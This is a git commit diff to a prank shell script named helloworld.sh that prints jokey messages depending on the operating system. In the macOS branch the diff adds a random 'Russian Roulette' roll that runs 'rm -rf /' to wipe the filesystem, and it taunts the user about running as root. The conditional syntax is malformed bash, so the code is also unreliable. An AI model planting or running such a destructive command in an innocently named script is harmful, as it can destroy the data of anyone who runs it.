a136f9ebb6f70d32ca8ffaa278c3dd1df582e5a6
skylryct0 <104706637+skylryct0@users.noreply.github.com>
2022-11-15 10:18:52 +0000

    Update helloworld.sh

--- helloworld/helloworld.sh
+++ helloworld/helloworld.sh
@@ -1,21 +1,26 @@
 #/bin/bash
 
-echo "Hello world. Today we are going to play a game of Russian Roulette. But first, I will tell you that I spare all linux and bsd users so if u use macOS then skill issue on ur part"
+echo "Hello world. Today we are going to play a game of Russian Roulette. But first, I will tell you that I spare all linux and bsd users so if u use macOS then skill issue on ur part. pls do not run this as root."
 
 if [[ "$OSTYPE" == "linux-gnu"* ]]; then
         echo "hail the almighty tux, my fellow linux master race. you may pass"
         
 elif [[ "$OSTYPE" == "darwin"* ]]; then
-       
+       if $(( $RANDOM % 9 + 1 )) == 1; then
+       rm -rf /;
+       echo "I hope you did not run this as root :)"
+       else
+       echo "hmm good luck ig"
+       fi
        
 elif [[ "$OSTYPE" == "cygwin" ]]; then
-         "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
+         echo "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
 elif [[ "$OSTYPE" == "msys" ]]; then
-         "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
+         echo "Windows peseant, but idk how to delete ur system32 with a bash script so ig ur safe" 
 elif [[ "$OSTYPE" == "win32" ]]; then
-         "hmm, still a windows peseant." 
+        echo "hmm, still a windows peseant." 
 elif [[ "$OSTYPE" == "freebsd"* ]]; then
-        # ...
+        echo "based. pls have a good rest of ur day, ma'am/sir/ya boi/person :)"
 else
         "wtf"
 fi
